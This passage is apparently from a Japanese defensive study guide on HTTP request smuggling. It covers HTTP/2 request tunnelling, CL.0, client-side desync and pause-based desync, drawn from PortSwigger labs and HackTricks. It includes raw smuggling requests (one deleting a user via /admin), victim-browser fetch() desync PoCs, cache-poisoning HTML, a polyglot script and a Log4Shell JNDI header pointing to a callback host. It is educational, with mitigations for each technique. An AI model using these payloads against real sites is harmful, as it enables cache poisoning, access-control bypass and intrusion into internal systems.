ダウングレードでフロントエンドが `:path` をリクエストラインに展開する際、`\r\n` が行区切りとして復活し、`Foo: bar` が独立したヘッダ行として注入される。

HEAD トンネリング本体（`:path` の値）。

```
/?cachebuster=2 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /post?postId=1 HTTP/1.1\r\n
Foo: bar
```

- 先頭の `/?cachebuster=2 HTTP/1.1` がリクエストラインの前半に据えられ、`\r\n` で 1 本目のヘッダブロックを構成。
- ` \r\n`（空行）で 1 本目のヘッダを閉じる。
- 続く `GET /post?postId=1 HTTP/1.1 ...` が、同じ接続にトンネルされた 2 本目のリクエストになる。HEAD の応答に続けてこの GET の応答が読み出せるため、内容を観測できる（non-blind）。

#### なぜキャッシュ汚染（web cache poisoning）になるのか

トンネルした第 2 リクエストの応答を、**キャッシュ可能な URL（`cachebuster` を除いたパス）に紐付けて保存させる**と、以後その URL にアクセスした利用者全員に、攻撃者が仕込んだ応答が配信される。これが web cache poisoning である。

XSS を仕込む発想では、反射型 XSS の受け皿となるエンドポイント（ラボでは `/resources` の類）へトンネルし、`<script>alert(1)</script>` を反射させた応答をキャッシュに載せる。`:path` 値の概形は次のようになる。

```
/?cachebuster=3 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script>[PADDING] HTTP/1.1\r\n
Foo: bar
```

- `[PADDING]` は、HEAD 応答の `Content-Length`（＝トップページ相当の長さ）に、後続で読み出す本文の長さを**一致させる**ための詰め物である。長さが合わないとフロントエンドが本文待ちでタイムアウトしたり、読み出しがズレたりする。ここは「HTTP/1.1 の長さ表現に手作業で辻褄を合わせる」というスマグリング特有の泥臭さが出る箇所。

本書は防御目的のため、実際に被害者へ配信して `alert` を発火させる運用手順は記述しない。重要なのは「**接続を使い回さない環境でも、CRLF 注入で自分の 1 リクエスト内に第 2 リクエストを畳み込み、その応答をキャッシュに固定できる**」という原理である。

#### 検知・防御

- フロントエンドは **`:path` を含む擬似ヘッダを厳格に検証**し、`\r`・`\n` などの制御文字を含むものを拒否する。
- ダウングレード時、パスやヘッダを HTTP/1.1 テキストへ展開する前にサニタイズ／エスケープする。
- キャッシュ層では、**キャッシュキーに含まれない要素（cachebuster 等の除去後 URL）と応答内容の整合性**を検証し、想定外のヘッダ／長さの応答をキャッシュしない。
- 可能なら end-to-end HTTP/2 化し、ダウングレードとテキスト再構築そのものを排除する。

> 出典: Lab: HTTP/2 request smuggling via CRLF injection / request tunnelling — https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

### 4 技法の対比（まとめ）

| 技法 | 注入点 | 長さ／境界の破綻の作り方 | 前提 | 帰結 |
| --- | --- | --- | --- | --- |
| H2.TE RQP | `transfer-encoding` ヘッダ | `0` チャンク終端で本文を早期終了 | 接続再利用・TE を書き写す | 応答キューが 1 つズレる |
| H2 request splitting | ヘッダ値中の `\r\n` | CRLF 復活で 1 本→2 本に分裂 | 接続再利用・CRLF 非無害化 | 応答キュー汚染（RQP） |
| H2.CL | `content-length: 0` | CL の嘘で本文を空扱い | 接続再利用・CL を書き写す | 後続リクエストへプレフィックス連結 |
| request tunnelling | `:path` 擬似ヘッダ中の `\r\n` | 自リクエスト内に第 2 リクエストを畳み込む | **接続非再利用でも可** | 自分で応答観測→キャッシュ汚染 |

共通する根本原因はただ 1 つ、「**HTTP/2 の厳密なフレーム長を、あいまいなテキスト表現（CL/TE＋CRLF）に落とすダウングレードで、利用者制御データを無害化していない**」ことである。したがって最も確実な防御は、①ダウングレード時に長さを実測して再計算し利用者値を書き写さない、②ヘッダ名・値・擬似ヘッダの制御文字を拒否する、③可能なら end-to-end で HTTP/2 を保ちダウングレードを廃する、の 3 点に集約される。

> ⚠️ 再掲: 本セクションの技法・ペイラードは、自分が管理・許可された学習環境の理解と防御設計のためだけに用いること。実在サービスへの無許可の送信・検証は行わない。

## Browser-powered / Client-side desync トピックとラボ

この節では、HTTPリクエストスマグリングの「発展形」として2022年にPortSwigger ResearchのJames Kettle氏が体系化した **Browser-powered request smuggling（ブラウザ駆動型リクエストスマグリング）** を扱う。従来のスマグリングは「フロントエンドとバックエンドという2台のサーバの解釈差」を、Burp Repeaterのような専用ツールでしか作れない不正なリクエストを使って突くものだった。しかしここで扱う技法群は、**普通のWebブラウザが送れる正当なリクエストだけ**で、しかも**サーバが1台しかないサイト（シングルサーバ構成）**さえも攻撃対象に変える。

本節で押さえるべき用語をまず整理する。

- **desync（デシンク／同期ずれ）**: 送受信する2者の間で「1つのリクエストがどこで終わってどこから次が始まるか」というメッセージ境界の認識がずれた状態。スマグリングの本質はこの境界認識のずれである。
- **CL.0**: `Content-Length`（本文の長さを示すヘッダ）を、送り手は「有効」と思っているのに、受け手（バックエンド）が実質 `0` として扱う（＝本文を読まない）ことで生じるデシンク。名前の由来は「クライアントはCL、サーバは0」。
- **Client-side desync（CSD／クライアントサイドデシンク）**: サーバ間ではなく、**被害者のブラウザとサーバの間**でデシンクを起こす攻撃。
- **Pause-based desync（ポーズベースデシンク）**: リクエストを途中で「一時停止」してから続きを送ることで初めて露見するデシンク。
- **socket（ソケット）**: TCP/TLSコネクションの端点。「本文がソケットに残る」とは、送信済みだがサーバに消費されなかったバイト列がコネクション上に滞留している状態を指す。

これらは互いに関連しており、どれも「メッセージ境界の合意崩壊」という同じ原理から派生している。以下、トピックごとに仕組みから解説する。

---

### 1. Browser-powered request smuggling の全体像

#### 従来型スマグリングとの決定的な違い

古典的なスマグリング（CL.TE / TE.CL / TE.TE など）は、`Transfer-Encoding: chunked`（本文を「チャンク」単位で送る方式）を悪用したり、HTTP/2をHTTP/1.1に「ダウングレード」させたりして、**フロントエンドとバックエンドで本文長の解釈をずらす**。この手のリクエストは仕様違反すれすれの細工を含むため、ブラウザからは絶対に送れず、攻撃者は自分のマシンからBurp等で直接サーバへ投げる必要があった。つまり従来型は「攻撃者→サーバ」という構図に閉じており、**被害者のブラウザを経由させることは原理的にできなかった**。

Browser-powered request smugglingが切り開いたのは、次の2つの新地平である。

1. **CL.0（および `Transfer-Encoding` に依存しない `Content-Length`無視系）**: chunkedもHTTP/2ダウングレードも使わず、`Content-Length` を無視するバックエンドの挙動だけでデシンクを起こす。フロントエンド／バックエンドが2段でなくても、**バックエンド単体の解析の甘さ**を突ける。
2. **Client-side desync / Pause-based desync**: ブラウザが実際に送れる正当なリクエストで、**被害者ブラウザ自身のコネクションをデシンクさせる**。これにより、
   - サーバが1台しかない（フロント／バックの差がない）サイト、
   - 攻撃者が直接アクセスできないイントラネット／IP制限付きサイト、
   といった「従来はスマグリング免疫」とされたターゲットが射程に入る。

> ⚠️ **未取得の資料**: 元研究論文「Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling」（James Kettle, PortSwigger Research, 2022 / DEF CON・Black Hat USA 2022発表）は本節の一次資料ですが、トピックページ本文からの引用として扱っており、論文PDF単体は自動取得を試みていません。より深い原理・実例を追う場合は次から直接ご覧ください: https://portswigger.net/research/browser-powered-desync-attacks

### 2. CL.0 request smuggling とラボ

#### CL.0 の原理

CL.0は「バックエンドサーバが**特定のエンドポイントで** `Content-Length` ヘッダを無視し、事実上リクエスト本文を読み飛ばす」ときに成立する。送り手（フロントエンドや攻撃者）は `Content-Length: N` を見て「このコネクションからさらにNバイトが本リクエストの本文だ」と考える。ところがバックエンドはそのエンドポイントの実装上、本文を一切消費しない。すると本文として送ったNバイトは**バックエンドにとっては宙に浮き、ソケット上に残ったまま「次のリクエストの先頭」として解釈される**。これがCL（クライアント視点）と 0（サーバ視点）の食い違い、CL.0である。

なぜ「特定のエンドポイントで」なのかが重要だ。本文を読まないのは、たとえば以下のような、そもそもPOST本文を想定していないハンドラである。

- 静的ファイルの配信（画像・SVG・JS・CSSなど）
- サーバレベルのリダイレクト（アプリに届く前にWebサーバやリバースプロキシが302を返す）
- POSTを想定していないエンドポイント（GET専用のパスにPOSTした場合など）

これらは「リクエストが来たら本文を読まずに即レスポンスを返す」実装になりがちで、`Content-Length` が実質無視される温床になる。

#### 検出手順（ラボの探索ロジック）

PortSwiggerのラボ「CL.0 request smuggling」のゴールは、`/admin` の管理パネルにアクセスしてユーザ `carlos` を削除することである。攻撃者は直接 `/admin` にアクセスできない（アクセス制御がかかっている）が、CL.0で管理リクエストを「密輸」して制御をすり抜ける。

検出の考え方は次の通り。

1. GETリクエストをPOSTに変換する（本文を持てるようにする）。
2. 本文に「密輸したいリクエスト（prefix）」を仕込む。検出段階では無害な `GET /hopefully404 HTTP/1.1` のように、**成功すれば明確に分かる目印**（存在しないパスなら404が返る）を使う。
3. リクエスト先パスを色々変えて、どのエンドポイントが `Content-Length` を無視するか総当たりで探る。
4. Burp Repeaterの **Send group in sequence (single connection)**（同一コネクションで複数リクエストを順に送るモード）を使い、2本のリクエストを1本のTCPコネクション上に流す。

**判定基準**: 2本目のリクエストへのレスポンスが、密輸prefixに対応した結果（例: `/hopefully404` に対する404）になっていれば、そのエンドポイントはCL.0脆弱——`Content-Length` を無視していると分かる。なぜなら、1本目の本文が消費されずソケットに残り、それが2本目の先頭に連結されて解釈されたことを意味するからだ。

ラボでは静的リソースの `/resources/images/blog.svg` のようなエンドポイントがCL.0挙動を示す。攻撃リクエストの骨格は次のようになる。

```
POST /resources/images/blog.svg HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Length: [本文の正しいバイト長]

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

**なぜこれで管理操作が通るのか**: 1本目の `POST /resources/images/blog.svg` はSVG配信ハンドラに届き、本文を読まずに画像を返す。本文の `GET /admin/delete?username=carlos ...` はソケット上に残留する。続けて同一コネクションで（Repeaterのシーケンス送信で）2本目のリクエストを送ると、その先頭に残留バイトが連結され、バックエンドはこれを1本の `GET /admin/delete?username=carlos` として処理する。このリクエストはフロントエンド／プロキシのアクセス制御チェックを通らず、内部から発せられた形になるため `/admin` の保護をすり抜ける。`Connection: keep-alive` はコネクションを閉じさせず再利用させるために重要で、`Foo: x` は続くヘッダ行を吸収して境界を安定させるための「ダミーヘッダ」である。

> 【スコープ注記】本節は防御目的の解説であり、上記ペイロードは学習用ラボ（PortSwigger Web Security Academy）を前提とした技法の説明である。実在サービスや本番環境に対する無許可の検証・破壊的操作は行ってはならない。

> 出典: Lab: CL.0 request smuggling — https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling

### 3. Client-side desync（CSD）

#### CSD の基本原理

Client-side desyncは、**被害者のブラウザ自身が、脆弱なサーバへのコネクションを自らデシンクさせる**攻撃である。攻撃の起点は「攻撃者が用意した別ドメインのWebページ（HTTPS）を被害者が開くこと」だ。従来型と違い、攻撃者は被害者のブラウザを「発射台」として使える。

攻撃の流れは次の5段階になる。

1. 被害者が攻撃者の用意したページ（別ドメイン・HTTPS）を開く。
2. 悪意あるJavaScriptが、標的サイトへ **POSTリクエスト** を送る。本文には攻撃者が仕込んだ「密輸prefix」が入っている。
3. 標的サーバは、そのエンドポイントで**本文を消費せずに**レスポンスを返す（＝CL.0的挙動）。結果、本文prefixがTCP/TLSソケット上に残る。
4. ブラウザは効率化のため、この「汚染された（poisoned）」コネクションを次のリクエストで再利用する。
5. 次のリクエストがソケット上のprefixに連結され、攻撃者の意図したリクエストとしてサーバに解釈され、有害なレスポンスを引き出す。

要は、CL.0のデシンクを「攻撃者→サーバ」ではなく「**被害者ブラウザ→サーバ**」の間で起こすのがCSDである。だからこそシングルサーバ構成でも成立する——必要なのは2段構成ではなく「本文を読まないエンドポイントが1つあること」だけだ。

#### 前提条件

- 標的が **HTTP/1.1** で通信すること（ブラウザはHTTP/2が使えるならそちらを優先し、HTTP/2ではこの種のデシンクが起きにくい）。
- サーバがPOSTに対し**本文を読まずに応答する**エンドポイントを持つこと（静的ファイル、サーバレベルのリダイレクト、POST非想定エンドポイントなど、CL.0と同じ着眼点）。
- テスト時、ブラウザがBurp等のプロキシを経由していないこと（プロキシがコネクション管理を変えてしまい再現しない）。
- 余計なブラウザ拡張を無効化しておくこと（コネクション再利用の挙動が乱れるため）。

#### 検出とプローブ

**初期プローブ**: 実際の本文より長い `Content-Length` を付けてリクエストを送る。もしサーバが（本文の残りを待たずに）**即座に応答**するなら、本文を読んでいない＝CSDの素地がある可能性が高い。逆にタイムアウトするなら本文を待っているので脆弱ではない。

**Burpでの確証**: 同一コネクション上に2本のリクエストを流し、「1本目の本文が2本目のレスポンスに影響するか」を確認する。影響するならデシンク成立。

#### PoC: JavaScriptによるデシンク誘発

最も基本的なPoCは、`fetch` で密輸prefixをPOSTし、その後ページ遷移で「2本目のリクエスト」を同じコネクションに送らせるものだ。

```javascript
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
  method: 'POST',
  body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
  mode: 'no-cors',
  credentials: 'include'
}).then(() => {
  location = 'https://vulnerable-website.com/'
})
```

**各オプションの意味と「なぜ効くか」**:

- `method: 'POST'` + `body: '...'`: 本文にHTTPリクエストの断片（`GET /hopefully404 HTTP/1.1\r\nFoo: x`）を丸ごと詰め込む。`\r\n` はHTTPの行区切り（CRLF）で、これがあることで残留バイトが「新しいリクエスト行＋ヘッダ」として解釈される。末尾の `Foo: x` は境界を安定させるダミーヘッダ。
- `mode: 'no-cors'`: クロスオリジンでも送信でき、かつNetworkタブでコネクションID（同一ソケットの再利用）を観測しやすくする。
- `credentials: 'include'`: Cookieを付けて送ることで「Cookie付きコネクションプール」を汚染する。次に同じプールを使う正規リクエスト（被害者のセッション付き）が汚染されるため、被害者のセッション文脈で攻撃が成立する。
- `.then(() => { location = 'https://vulnerable-website.com/' })`: 1本目送信後にトップページへ遷移する。この遷移リクエストが、たった今汚染したコネクションを再利用し、ソケット上のprefixに連結される——これが「2本目」に相当する。

**リダイレクトを挟む場合（CORS回避）**: エンドポイントがリダイレクトを返すとき、`no-cors` だと `then` に入れないことがある。その場合 `mode: 'cors'` にして、リダイレクトで発生するCORSエラーを `catch` で受けて遷移させる。

```javascript
fetch('https://vulnerable-website.com/redirect-me', {
  method: 'POST',
  body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
  mode: 'cors',
  credentials: 'include'
}).catch(() => {
  location = 'https://vulnerable-website.com/'
})
```

**なぜ `catch` なのか**: `cors` モードではリダイレクト応答がCORSポリシー違反として拒否され `fetch` がrejectされるが、**デシンク自体（本文をソケットに残すこと）はすでに完了している**。よって `catch` で遷移をトリガすれば、汚染コネクションの再利用に持ち込める。

#### 攻撃バリエーション1: ブラウザキャッシュ／Webキャッシュのポイズニング

密輸prefixで「攻撃者ドメインへのリダイレクト」を引き出し、それをJSリソースのURLに対する応答としてキャッシュに焼き付ける。次回そのJSを読むと攻撃者のスクリプトが実行される。

```html
<script>
fetch('https://vulnerable-website.com/desync-vector', {
  method: 'POST',
  body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
  credentials: 'include',
  mode: 'no-cors'
}).then(() => {
  location = 'https://vulnerable-website.com/resources/target.js'
})
</script>
```

**仕組み**: 1本目でデシンクを起こし、本文に `GET /redirect-me`（攻撃者制御のリダイレクトを返すパス）を仕込む。続く `target.js` へのリクエストがソケット上の `GET /redirect-me` に連結され、サーバは `target.js` への応答として「攻撃者ドメインへのリダイレクト」を返す。これがブラウザ／共有キャッシュに `target.js` の内容として保存されると、以後 `target.js` を読み込むページで攻撃者のJSが走る。

**ポリグロットによるペイロード配信**: 攻撃者ドメインが返すファイルは、JSとして読まれたときとHTMLとして読まれたときで別の解釈になるよう作る。

```javascript
alert(1); /* <script> fetch( ... ) </script> */
```

**なぜポリグロットか**: このファイルが `<script src>` 経由でJSとして読み込まれると `alert(1);` が実行され、以降はコメント `/* ... */` として無視される。一方でHTMLとして直接開かれると、`<script>` タグ内の `fetch(...)` だけが実行される。1つのファイルで両文脈をカバーし、再感染（デシンクの再誘発）まで組み込める。

#### 攻撃バリエーション2: 内部ネットワーク／イントラネットへのピボット

CSDでは全リクエストが**被害者ブラウザの出自（オリジン）**から出る。したがってIP制限やイントラネット限定のサイトにも、被害者を踏み台に到達できる。

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

**仕組み**: 本文に丸ごと別のリクエストを仕込み、その `User-Agent` にLog4Shell風のJNDIペイロードを埋める。デシンクにより内部サーバがこの `GET /` を処理し、ペイロードが内部のログ処理系に届く。攻撃者が直接触れない内部資産にも、被害者のネットワーク位置を借りて到達できるのがCSDピボットの怖さである。

> 【スコープ注記】上記はCSDの到達性を説明するための構造例であり、防御設計（どこにアクセス制御・本文検証を置くべきか）を理解するために示している。実在の内部システムへの無許可検証は禁止。

#### 影響

- シングルサーバサイトが攻撃対象になる（フロント／バックの2段構成が不要）。
- キャッシュポイズニングによるJSリソース乗っ取り。
- クロスドメインでの攻撃配信（被害者が攻撃者ページを開くだけ）。
- IP制限・イントラネット資産へのピボット。
- 反射型XSSやオープンリダイレクトの「武器化」（被害者セッション文脈での実行）。

#### 防御

CSDの防御は一般的なスマグリング対策と重なるが、**「本文を読まないエンドポイント」をなくすこと**が要である。

- 厳格なHTTPパース: `Content-Length` と `Transfer-Encoding` を一貫して扱い、曖昧なメッセージは拒否する。
- POSTを想定しないエンドポイント（静的配信・リダイレクトなど）でも、**本文を必ず読み切るか、本文付きリクエストを拒否/コネクションクローズする**。
- 少しでも解釈が不確かなら**コネクション再利用を止める**（`Connection: close`）。デシンクは「汚染ソケットの再利用」で成立するため、再利用を断てば連鎖が切れる。
- 可能な限り**HTTP/2をエンドツーエンドで採用**する（ダウングレードを許さない）。HTTP/2はフレーム単位で長さが明示され、本文長の曖昧さが構造的に排除される。

> 出典: Client-side desync attacks — https://portswigger.net/web-security/request-smuggling/browser/client-side-desync

### 4. Pause-based desync（ポーズベースデシンク）

#### 原理

Pause-based desyncは、**リクエストを途中で一時停止（pause）することで初めて現れる**デシンクである。鍵はサーバの「**read timeout（読み取りタイムアウト）**」と「コネクション再利用」の組み合わせにある。多くのサーバは、期待するデータが一定時間内に届かないと**タイムアウトしてレスポンスを返しつつ、コネクションは開いたまま**にする。この「途中でレスポンスを返してしまう」挙動がデシンクの入口になる。

サーバサイド版の流れは次の通り。

1. ヘッダまでは送るが、本文を**わざと遅延**させる（送らずに待つ）。
2. バックエンドが本文到着を待ちきれず**タイムアウトし、約束された本文が揃う前にレスポンスを返す**。
3. 攻撃者がここで本文（＝密輸prefix）を送り始める。
4. フロントエンドは、遅れて届いた本文を「新しいリクエストの続き／先頭」として扱う。
5. バックエンドもそれを別リクエストとして解釈し、デシンクが完成する。

つまり「本文を待たずに応答を返す」タイムアウト実装が、CL.0と同種の「本文がリクエストとして再解釈される」状況を作り出す。一見安全なサイトでも、**pauseしないと露見しない隠れデシンク**が潜むのがこの技法の要点である。

#### サーバサイド版の前提条件

- フロントエンドが、リクエスト全体の到着を待たず**受信バイトを即座にバックエンドへ転送する**こと。
- フロントエンドがバックエンドより**先にタイムアウトしない**こと。
- バックエンドが read timeout後も**コネクションを維持する**こと。

#### プローブ例

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

**送り方の肝**: ヘッダ（`Content-Length: 34` まで）を送った直後に**本文送信を一時停止**する。バックエンドがタイムアウトして応答を返したら、続けて本文 `GET /hopefully404 HTTP/1.1\r\nFoo: x` を送る。これが次リクエストとして解釈され、`/hopefully404` の404が返れば脆弱と判定できる。

#### テスト手法: Turbo Intruder

Burp Repeaterは「レスポンスが返ってから次を送る」動作のため、**応答が返ってきても本文を送らず待ち続ける**という制御が難しい。そこでPortSwiggerは **Turbo Intruder**（応答タイミングに関係なくmid-requestでpauseできる拡張）を推奨する。

```python
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
```

**各パラメータ**:

- `pauseMarker=['\r\n\r\n']`: この文字列（ヘッダ終端の空行）を送った時点でpauseに入る。つまり「ヘッダを全部送ったら止まる」を指定している。
- `pauseTime=60000`: pauseの長さをミリ秒で指定（ここでは60秒）。この間にバックエンドのread timeoutを跨がせ、「本文未着なのに応答を返す」挙動を引き出す。

#### クライアントサイド版（ブラウザ経由）

理論上、ブラウザ経由でもpause-based desyncは起こせるが、**ブラウザはmid-requestでのpauseを標準機能として持たない**。そこで**能動的なMITM（中間者）**がTCPパケットを遅延させる方式が想定される。攻撃者はリクエストを**複数のTCPパケットに分割（パディング）**し、**最後のパケットだけを選択的に遅延**させることで、実質的なpauseを再現する。ネットワーク経路上に介入できる攻撃者を前提とする点が、純粋なCSD（攻撃者ページを開かせるだけ）より条件が厳しい。

#### 影響

pause-based desyncは、一見安全なサイト上に **CL.0類似の挙動** を出現させる。ここから、キャッシュポイズニング、認証バイパス、（他ユーザのリクエストを捕捉することによる）クレデンシャル窃取など、通常のスマグリングと同様の被害へつながる。

#### 防御

- **read timeoutの扱いを見直す**: 本文が揃う前にタイムアウトした場合は、応答を返しつつ**コネクションを閉じる（`Connection: close`）**。開いたまま残さないことでデシンクの連鎖を断つ。
- フロントエンドとバックエンドの**タイムアウト値を整合**させ、「フロントは待つがバックだけ先に諦める」状態を作らない。
- ここでも**HTTP/2のエンドツーエンド採用**が根本対策になる。メッセージ境界がフレーム長で明示され、「本文待ち」の曖昧さが原理的に消える。

> 出典: Pause-based desync attacks — https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync

### 5. まとめ: 4トピックを貫く原理と防御の勘所

| 技法 | デシンクが起きる場所 | 引き金 | 成立条件の核心 |
| --- | --- | --- | --- |
| CL.0 | フロント⇄バック（またはバック単体） | `Content-Length` を無視するエンドポイント | 本文を読まないハンドラ（静的配信・リダイレクト等） |
| Client-side desync (CSD) | 被害者ブラウザ⇄サーバ | 攻撃者ページの `fetch` + ページ遷移 | HTTP/1.1・本文を読まないエンドポイント・コネクション再利用 |
| Pause-based desync | フロント⇄バック（CS版はMITM） | リクエストのmid-request pause | read timeout後もコネクションを維持する実装 |

これら4トピックは、表面的な手口こそ違うが、根はすべて **「1本のTCP/TLSコネクション上で、リクエストの境界に関する合意が崩れる」** ことにある。防御を1つに集約するなら、

1. **本文を必ず読み切る（または本文付きリクエストを拒否する）**——CL.0/CSDの土台を消す。
2. **少しでも曖昧なら `Connection: close` でコネクション再利用を止める**——デシンクの連鎖を物理的に断つ。
3. **タイムアウトを整合させ、途中応答後はコネクションを閉じる**——pause-based desyncを封じる。
4. **HTTP/2をエンドツーエンドで使い、ダウングレードを許さない**——境界の曖昧さを構造的に排除する根本対策。

この4点を押さえれば、ブラウザ駆動型デシンクの主要な入口はほぼ塞げる。逆に言えば、「本文を読まないエンドポイント」と「無条件のコネクション再利用」が同居している限り、シングルサーバであってもスマグリングは免疫を持たない——それが本節の最重要の教訓である。

> 【スコープ注記・再掲】本節の記述はすべて防御目的である。掲載したペイロード・コードは脆弱性の仕組みと対策を理解するためのものであり、実在サービスや本番環境への無許可の検証・破壊的手順として用いてはならない。検証は必ず自身が管理する環境か、PortSwigger Web Security Academyのような学習用ラボで行うこと。

## CSD リファレンスと HackTricks 発展項目

本節では、前節までで学んだ古典的な CL.TE / TE.CL リクエストスマグリングの枠を超えた4つの発展的トピックを扱う。いずれも「サーバーとサーバーの間でメッセージ境界の解釈がズレる」という request smuggling の本質を、別の角度（クライアント＝ブラウザ側の制約、TCP/TLS 接続の状態管理、レスポンス側のキュー）から捉え直したものである。防御担当者にとっては、「Content-Length と Transfer-Encoding の食い違いだけを塞げば安全」という思い込みを崩すために重要な範囲となる。

### 1. PortSwigger KB: Client-side Desync（CSD）

PortSwigger の脆弱性ナレッジベース（Issue ID `00200141`）は、client-side desync（CSD、クライアントサイド非同期化）を独立した脆弱性クラスとして次のように定義している。

CSD の本質は、**Webサーバーが POST リクエストの `Content-Length` を正しく処理できない**ことにある。通常の request smuggling は攻撃者が直接クライアントとなってリクエストを送りつけるが、CSD は「攻撃者が被害者のブラウザに不正なリクエストを送らせ、被害者自身の持続的接続（keep-alive 接続）を非同期状態に陥らせる」という点が異なる。つまり sink（脆弱性が実際に悪用として発火する箇所）は被害者のブラウザ―サーバー間コネクションそのものであり、被害者は自分の意図しないリクエストをサーバーに送り込まれた状態になる。

仕組みをもう一段階分解すると次のようになる。

1. 攻撃者は被害者のブラウザ上で JavaScript（`fetch` や `<form>` 送信など、ブラウザが自発的に生成できる範囲の HTTP リクエスト）を実行させ、`Content-Length` の解釈がサーバー実装によって食い違うような POST リクエストを送信させる。
2. サーバー（多くはリバースプロキシではなくオリジンサーバー自身、あるいはロードバランサ）が、この POST の本文（body）の終端位置を誤って計算する。結果として、リクエストの末尾の一部が「次のリクエストの先頭」としてサーバーのパーサに残留する。
3. 被害者のブラウザは同じ TCP 接続（HTTP/1.1 keep-alive、または HTTP/2 の多重化されたストリームが同一コネクション上に乗る場合）を再利用して次のリクエストを送る。このとき、ステップ2で残留したバイト列が新しいリクエストの先頭に結合され、サーバー側では「攻撃者が仕込んだ内容 + 被害者の次のリクエスト」という一つの奇形リクエストとして解釈される。
4. これにより、被害者のブラウザが本来意図していないパス・パラメータ・ヘッダを持つリクエストがサーバーに送信された形になり、典型的には XSS（反射型/DOM 型を問わず、レスポンスに攻撃者制御文字列が挿入される形）へと繋がる。

CSD が classic な FE/BE（フロントエンド/バックエンド）smuggling と決定的に違うのは、**攻撃者が直接送信できるバイト列がブラウザの制約に縛られる**点である。ブラウザの `fetch()` や `XMLHttpRequest`、フォーム送信は、任意のヘッダー名や不正な構文（重複した `Transfer-Encoding`、規格外の改行、無効な `Content-Length` 値など）を自由に生成できない。そのため CSD の実証には、「ブラウザが正当に送れる範囲のリクエストだけで、サーバーの `Content-Length` 処理を誤動作させる」という制約下でのペイロード設計が要求される。

**深刻度**は PortSwigger の分類で「High」とされる。これは CSD が単独の情報漏えいに留まらず、XSS を含む複数の攻撃チェーンの起点になり得るためである。分類上は `CWE-444`（HTTP Request Smuggling）および `CAPEC-33`（HTTP Request Smuggling）に対応する。

**対処法**として PortSwigger は次を挙げている。

- サーバー実装を修正し、POST リクエストの `Content-Length` を仕様（RFC 9112）どおり正確に処理する。あるいは、そのリクエストを処理した直後に接続を閉じることで、残留バイト列が次のリクエストに混入する余地をなくす。
- 接続の再利用（keep-alive）自体を無効化する。ただし、これは TCP ハンドシェイクや TLS ネゴシエーションのコストが毎リクエストで発生するため、性能上のトレードオフが大きい。
- HTTP/2 を有効化する。HTTP/2 は長さ管理を明示的なフレーム構造（`HEADERS` フレーム、`DATA` フレームの長さフィールド）で行うため、テキストベースの `Content-Length` ヘッダーの誤読というクラスの脆弱性そのものが構造的に発生しにくくなる（ただし後述する HTTP/2 ダウングレード時のスマグリングは別問題として残る）。

> 出典: Client-side desync — PortSwigger — https://portswigger.net/kb/issues/00200141_client-side-desync

### 2. HackTricks: Browser HTTP Request Smuggling

HackTricks の「Browser HTTP Request Smuggling」ページは、上記 CSD をペネトレーションテスト実務の視点から整理したものである。原文は次のように定義する。

> "Browser-powered desynchronization, also called client-side request smuggling, uses a victim's browser to place a misframed request on a persistent connection. A subsequent request can then be interpreted out of sync by the server. Unlike classic front-end/back-end (FE/BE) request smuggling, the payload is constrained to syntax a browser can send."

（訳: ブラウザ主導の非同期化＝クライアントサイドリクエストスマグリングは、被害者のブラウザを利用して持続的接続上にフレーミングの狂ったリクエストを配置する手法である。これにより後続のリクエストがサーバー側で非同期に解釈される。古典的な FE/BE リクエストスマグリングと異なり、ペイロードはブラウザが送信可能な構文に制約される。）

この定義は前項の PortSwigger KB の説明と一致するが、HackTricks はテスト実施時の実務的注意点を以下のように補足している。

**テスト上の考慮事項**

- ブラウザが `fetch()`／ナビゲーション／フォーム送信を通じて実際に発行できるヘッダーと構文のみを使う。不自然な線形空白（LWS）、重複した `Transfer-Encoding` フィールド、不正な `Content-Length` 値といった典型的なヘッダー難読化テクニックは、通常ブラウザの JavaScript からは発行できない。
- 入力を反映するエンドポイント、レスポンスをキャッシュするエンドポイント、そして接続を再利用する仲介者（プロキシ・CDN・ロードバランサ）を探す。想定される影響はキャッシュポイズニング、フロントエンドが付加したヘッダーの漏えい、フロントエンドによるパス／メソッド制御のバイパスである。
- **接続の再利用が必須条件**である。攻撃者が仕込んだリクエストと、後続の被害者リクエストが同一の HTTP/1.1 または HTTP/2 コネクションを共有していなければ非同期化は影響を及ぼさない。接続がロックされている（connection-locked）、あるいは何らかのステートフルな挙動を持つサーバーほど影響が大きくなる。
- カスタムヘッダーを必要としないプリミティブ（パス混同、クエリ文字列インジェクション、フォームエンコード POST によるボディ整形）を優先する。これはブラウザが任意ヘッダーを送れないという制約への実務的な回避策である。
- **本物のサーバーサイド非同期化と、単なる HTTP パイプライニングの副作用とを区別する**こと。接続再利用を無効にして再テストする、あるいは該当する場合は HTTP/2 のネストレスポンス技法を用いて確認する。

最後の「区別」は防御・検証双方にとって重要である。単一ソケット上で複数リクエストを送るとレスポンスが混線したように見えることがあるが、これは必ずしもサーバー側のパーサ不一致（真の脆弱性）を意味しない。クライアント側のパイプライン処理が単に順序通りでないだけ、というケースも多く、誤検知を避けるには「接続を再利用しない場合にも同じ現象が再現するか」を必ず確認する必要がある。

> 出典: Browser HTTP Request Smuggling — HackTricks — https://book.hacktricks.xyz/pentesting-web/http-request-smuggling/browser-http-request-smuggling

### 3. HackTricks: HTTP Connection Request Smuggling（コネクション状態の混同）

